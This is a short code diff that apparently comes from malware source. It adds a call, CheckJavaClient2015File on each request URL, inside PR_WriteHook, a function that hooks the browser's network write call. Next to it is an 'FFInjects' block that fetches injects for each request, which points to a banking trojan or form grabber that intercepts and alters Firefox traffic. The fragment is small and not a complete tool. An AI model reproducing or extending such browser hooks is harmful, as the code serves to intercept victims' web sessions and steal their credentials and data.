@@ -785,6 +785,13 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 
 		if (MakeInfo(Request, (PCHAR)buf, (int)amount ) )
 		{
+
+			#ifdef JavaClient2015SaverH
+				CheckJavaClient2015File(Request->URL);
+			#endif
+
+
+
 			#ifdef FFInjects
 				if (Config::GetInjectsForRequest(Request))
 				{
